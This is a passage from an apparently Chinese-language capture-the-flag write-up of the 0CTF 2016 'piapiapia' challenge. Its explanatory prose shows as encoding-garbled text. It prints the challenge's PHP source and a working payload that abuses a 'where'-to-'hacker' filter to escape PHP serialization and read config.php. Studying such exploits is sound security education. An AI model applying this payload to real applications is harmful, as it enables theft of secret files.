class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> __class__;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-variable">$config</span>);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">register</span>.phpå°±æ˜¯ç®€å•çš„æ³¨å†ŒåŠŸèƒ½<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//config.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-comment">//!</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//profile.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">show_profile</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>);<span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„ååºåˆ—åŒ–</span><br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„file_get_contentså‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨å…¶è¯»å–config.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//update.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">update_profile</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>));<span class="hljs-comment">//userå¯¹è±¡è®¿é—®update_profileæ–¹æ³•ï¼Œå­˜åœ¨åºåˆ—åŒ–</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>flag</code>åœ¨<code>config.php</code>ä¸­ï¼Œè¦æƒ³åŠæ³•è¯»è¿™ä¸ªæ–‡ä»¶ã€‚<code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code>ä½¿æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œæƒ³åŠæ³•è®©<code>profile</code>æ•°ç»„ä¸­<code>photo</code>é”®å¯¹åº”çš„å€¼æ˜¯<code>config.php</code>å°±è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>);<span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„ååºåˆ—åŒ–</span><br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„file_get_contentså‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨å…¶è¯»å–config.php</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡<code>$profile</code>è¿”å›æ•°ç»„ï¼Œç„¶åå¯¹æ•°ç»„é”®å€¼å¯¹è¿›è¡Œè¯»å–èµ‹å€¼ã€‚é‚£ä¹ˆå‰é¢è‚¯å®šæœ‰ä¸ªåºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬è·Ÿè¸ªåˆ°åºåˆ—åŒ–éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">update_profile</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>));<span class="hljs-comment">//userå¯¹è±¡è®¿é—®update_profileæ–¹æ³•ï¼Œå­˜åœ¨åºåˆ—åŒ–</span><br><span class="hljs-comment">//update_profile:</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-comment">//update</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æŠ“ä¸ªåŒ…çœ‹ä¸‹æˆ‘ä»¬<code>update</code>çš„æ•°æ®æ˜¯æ€ä¹ˆä¼ é€’çš„ï¼š</p><p><img src="/img/pia2.png" alt="pia2"></p><p>ç°åœ¨æ€è·¯å°±æ¸…æ™°äº†ï¼š<code>POST</code>ä¼ é€’æˆ‘ä»¬è¦æ›´æ–°çš„æ•°æ®(<code>phone,email,nickname,photo</code>)å¹¶è½¬æ¢æˆæ•°ç»„å½¢å¼(æ³¨æ„è¿™é‡Œè®¾ç½®äº†<code>waf</code>)ï¼Œ<code>photo</code>ä¼šé€šè¿‡<code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;])</code>å’Œ<code>move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]))</code>ä¸Šä¼ åˆ°æŸä¸ªä½ç½®ï¼Œç„¶ååˆ©ç”¨<code>base64_encode(file_get_contents($profile[&#39;photo&#39;])</code>è¯»å–ã€‚</p><p>çœ‹ä¸‹è®¾ç½®çš„<code>waf</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­£åˆ™åŒ¹é…çš„è¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ æ•°ç»„ç»•è¿‡ï¼Œæ¯”å¦‚<code>nickname[]=ç‚¹ç‚¹ç‚¹</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;zhengze.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æœªæˆåŠŸç»•è¿‡ï¼&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;æˆåŠŸç»•è¿‡ï¼&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>/?nickname=[]=;&#125;å³å¯</code></p><p>åé¢æ€è·¯å°±æ˜¯é€šè¿‡æ„é€ ç‰¹æ®Šçš„<code>nickname</code>è®©ç³»ç»Ÿåœ¨åºåˆ—åŒ–-ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¿½ç•¥çœŸæ­£çš„<code>photo</code>ï¼Œå»è¯»<code>config.php</code></p><p>ä¸¾ä¸ªæ —å­(å‚è€ƒ<code>https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/</code>)ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span> = a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;12345678901&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ss@q.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;sea_sand&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>));<br><br>ç»“æœå¦‚ä¸‹ï¼š<br><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [phone] =&gt; <span class="hljs-number">12345678901</span><br>    [email] =&gt; ss@q.com<br>    [nickname] =&gt; sea_sand<br>    [photo] =&gt; config.php<br>)<br><span class="hljs-comment">//å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–ä¹‹åï¼Œæœ€åé¢uploadè¿™ä¸€éƒ¨åˆ†å°±æ²¡äº†ï¼ˆä¹Ÿå¯ä»¥ç†è§£ä¸ºé—­åˆäº†ï¼‰ã€‚åæ‰äº†åé¢é‚£éƒ¨åˆ†ã€‚</span><br></code></pre></td></tr></table></figure><p>å…¶å®å¦‚æœä¸é™åˆ¶æ˜¯æ•°ç»„çš„è¯æˆ‘ä»¬æ„é€ <code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ç„¶åé€šè¿‡å­—ç¬¦ä¸²æ›¿æ¢æŠŠè¿™æ®µåå‡ºå»å°±è¡Œï¼Œä¸è¿‡å› ä¸ºè¦æ˜¯æ•°ç»„çš„å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ <code>â€;&#125;s:5:â€œphotoâ€;s:10:â€œconfig.phpâ€;&#125;</code>(å…¶å®å°±åœ¨åˆ†å·åå¤šäº†ä¸ª<code>&#125;</code>)</p><p>ç„¶ååˆ©ç”¨å­—ç¬¦ä¸²æ›¿æ¢æŠŠè¿™34ä¸ªå­—ç¬¦åå‡ºå»ï¼š<code>whereåˆ°hackerå¤šäº†ä¸€ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦34ä¸ªwhere</code>:</p><p><code>payload:nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>ç»è¿‡åºåˆ—åŒ–æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">$profile = a<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;phone&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;12345678901&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;email&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ss@q.com&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;nickname&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">204</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;photo&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;config.php&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:39:&quot;</span>upload/<span class="hljs-number">804</span>f743824c0451b2f60d81b63b6a900<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>å› 